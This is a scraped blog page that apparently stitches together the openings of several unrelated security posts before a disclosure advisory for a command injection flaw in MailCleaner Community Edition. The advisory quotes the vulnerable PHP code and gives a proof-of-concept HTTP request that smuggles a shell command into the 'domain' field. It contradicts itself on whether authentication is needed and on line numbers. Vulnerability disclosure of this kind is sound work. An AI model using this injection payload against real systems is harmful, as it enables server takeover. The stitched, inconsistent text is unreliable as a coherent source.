LiderAhenk is an open source software system that enables centralized management, monitoring and control of systems and users on the corporate network.

In this blog post, you will see how bad it can get when you have a critical security vulnerability on your centralized client management system.

A couple of days ago, I came up with news that Pardus will organize a report-bug contest. I love to contribute to open-source projects. So that was a pretty good chance to revisit one of my old friends, Pardus, and uncover security and/or privacy issues.

It has been a while since I haven’t published a post on our beloved blog. Today I would like to share technical details and POC for a pretty funny vulnerability that I’ve found at GravCMS.

As I’ve been saying since 2015, my pentest team and I love to chase after 0days during penetration test engagements. This time we come across a GravCMS during the external OSINT process.

I believe that doing a security research is all about trying to understand high-level of architecture of the products and finding a creative attack vectors.

I hope this blog post will show some the readers how to start doing security research.

I’ve been doing security researches on softwares for a quite long time. During these researchs, I often find myself in a situation where in I think about the state of mind of developers, problems that occur during developments and core problems of nature of software crafting teams. Thinking about these questions always lead me to realize possible software bugs.

~~People~~ developers are tend to make mistakes by the nature of human being. Mistakes made by developers usually end up with software bugs. If there is a software bug, security researchers always try to take an advantage of this bugs and convert it to a software vulnerability. For that reason, I always start my research by defining a places in softwares where things left to the developer’s initiative. One of good the example for that ‘places’, which also main focus of this post, can be a session validations.

# Advisory | MailCleaner Community Edition Remote Code Execution CVE-2018-20323

 [December 19, 2018December 26, 2018](https://pentest.blog/advisory-mailcleaner-community-edition-remote-code-execution/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/)

In this article, I would like to share a remote code execution vulnerability details of MailCleaner Community Edition product.

### Advisory Informations

**Remotely Exploitable:** Yes
**Authentication Required:** NO
**Vendor URL:**<https://www.mailcleaner.net/>
**Date of found:** 19 Dec 2018

### Technical Details

I identified command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an operating system command under the context of the web server user which is root.

Logs.php file which located at www/soap/application/MCSoap has a vulnerability command execution code flow between lines 45-49 (following section)

```
static public function Logs_StartTrace($params) {

		$trace_id = 0;

		require_once('MailCleaner/Config.php');
		$mcconfig = MailCleaner_Config::getInstance();

		if (!isset($params['regexp'])
		|| !$params['datefrom'] || !preg_match('/^\d{8}$/', $params['datefrom'])
		|| !$params['dateto'] || !preg_match('/^\d{8}$/', $params['dateto']) ) {
			return array('trace_id' => $trace_id);
		}
		$cmd = $mcconfig->getOption('SRCDIR')."/bin/search_log.pl ".$params['datefrom']." ".$params['dateto']." '".$params['regexp']."'";
		if (isset($params['filter']) && $params['filter'] != '') {
			$cmd .= " '".$params['filter']."'";
		}

                if (isset($params['hiderejected']) && $params['hiderejected']) {
                    $cmd .= ' -R ';
                }

		if (isset($params['trace_id']) && $params['trace_id']) {
			$trace_id = $params['trace_id'];
		} else {
			$trace_id = md5(uniqid(mt_rand(), true));
		}
                $cmd .= " -B ".$trace_id;

		$cmd .= "> ".$mcconfig->getOption('VARDIR')."/run/mailcleaner/log_search/".$trace_id." &";
		$res = `$cmd`;
		return array('trace_id' => $trace_id, 'cmd' => $cmd) ;
	}
```

As you can see, lines between 20-28 there is an operating system command execution flow. If you look at the code carefully, you can see parameters like **filter** has been used without validation within the command.

I’ve followed all the code flows where **Logs\_StartTrace** has been used. One of these usage was interesting;

```
	public function startFetchAll($params) {
		$trace_id = 0;
		$slave = new Default_Model_Slave();
        $slaves = $slave->fetchAll();

        foreach ($slaves as $s) {
        	$res = $s->sendSoapRequest('Logs_StartTrace', $params);
        	if (isset($res['trace_id'])) {
        		$trace_id = $res['trace_id'];
                $params['trace_id'] = $trace_id;
        	} else {
                        continue;
        	}
        }
        return $trace_id;
	}
```

As you can see, our method where we have an issue is being called through soap service.

Further analysis showed that **startFecthAll** method has been used within **ManagetracingController** like follow.

```
public function searchAction() {
        // ... OMITTED CODE ...
    $view->loading = $loading;
    $view->params = $this->getSearchParams();

    $orderfield = 'date';
    $orderorder = 'desc';
        // ... OMITTED CODE ...
    }
    if (isset($session->trace_id) && $session->trace_id) {
        // ... OMITTED CODE ...
    } else {
        ## no search running, launch search
        if ($request->getParam('domain') != "") {
            $trace_id = $element->startFetchAll($params);
            $session->trace_id = $trace_id;
        }
        $view->loading = 1;
    }
```
## Proof Of Concept

Following HTTP request successfully triggered vulnerability.

```
POST /admin/managetracing/search/search HTTP/1.1
Host: 12.0.0.100
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Cookie: MCSESS=3m6nk64ebqbf1jsnkc8vkmrg32;
Content-Type: application/x-www-form-urlencoded
Content-Length: 576

search=bMrpc&domain=';sleep 100;%26&submit=1
```
## Metasploit Module

As usual ?

# About Us

We just want to give back to the community and help people to learn. That’s all.

We are the penetration test and vulnerability research team of [PRODAFT SARL](https://www.prodaft.com/) (a swiss-based Cyber Intelligence company). Since we don’t like to use what we are doing on technical side as a marketing stuff, we decided to share what we all know in here without any “marketing pop-ups”. Would you like to hire us ? You know how to reach us.
